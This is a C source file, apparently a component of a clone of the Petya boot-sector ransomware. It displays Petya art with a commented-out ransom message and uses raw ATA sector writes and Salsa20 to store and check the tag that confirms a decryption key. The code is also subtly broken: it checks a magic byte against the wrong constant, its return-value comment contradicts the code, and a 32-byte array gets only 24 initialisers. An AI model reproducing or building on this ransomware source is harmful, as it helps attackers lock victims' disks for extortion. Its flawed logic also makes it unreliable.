// petya.c

#include "petya.h"
#include "types.h"
#include "ata.h"
#include "salsa20.h"
#include "bootloader.h"

#define VALIDATE_MAGIC_0 0xAB
#define VALIDATE_MAGIC_1 0xCD
#define VALIDATE_MAGIC_2 0xEF
#define VALIDATE_MAGIC_3 0x12

void print_petya_art(void)
{
    vga_clear();
    vga_draw_centered_ascii(PETYA_ART);    
    //vga_puts(RANSOM_MSG);
    vga_putchar('\n');
}

static const uint8_t KNOWN_PLAIN[32] = {
    'P', 'E', 'T', 'Y', 'A', 'L', 'O', 'L',
    0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,
    0xDE,0xAD,0xBE,0xEF,0xCA,0xFE,0xBA,0xBE
};

static void compute_tag(const uint8_t key[32], uint8_t tag[TAG_SIZE])
{
    uint8_t nonce[8] = {
        0xAB, 0xCD, 0xEF, 0x12,
        0x34, 0x56, 0x78, 0x9A,
    };

    Salsa20_Ctx ctx;
    salsa20_init(&ctx, key, nonce, 0xDEADBEEF);
    salsa20_encrypt(&ctx, KNOWN_PLAIN, tag, TAG_SIZE);
}

int validate_save_tag(const uint8_t key[32])
{
    uint8_t sector[512] = { 0 };

    sector[0] = VALIDATE_MAGIC_0;
    sector[1] = VALIDATE_MAGIC_1;
    sector[2] = VALIDATE_MAGIC_2;
    sector[3] = VALIDATE_MAGIC_3;

    compute_tag(key, sector + 4);

    if (ata_write(VALIDATE_SECTOR, 1, sector) != 0)
    {
        vga_puts("validate_save_tag: write failed\n");
        return -1;
    }

    vga_puts("Validation tag saved to sector");
    vga_put_dec(VALIDATE_SECTOR);
    vga_putchar('\n');

    return 0;
}

int validate_check_key(const uint8_t key[32])
{
    uint8_t sector[512];

    if (ata_read(VALIDATE_SECTOR, 1, sector) != 0)
    {
        vga_puts("validate_check_key: read failed\n");
        return -1;
    }

    if (sector[0] != VALIDATE_MAGIC_0 || sector[1] != VALIDATE_MAGIC_1 || sector[2] != VALIDATE_MAGIC_3 || sector[3] != VALIDATE_MAGIC_3)
    {
        vga_puts("Validate sector not initialized!");
        return -1;
    }

    uint8_t expected_tag[TAG_SIZE];
    compute_tag(key, expected_tag);

    uint8_t diff = 0;
    for (int i = 0; i < TAG_SIZE; i++)
        diff |= expected_tag[i] ^ sector[i + 4];

    return diff == 0; // 0 = all bytes match = correct key
}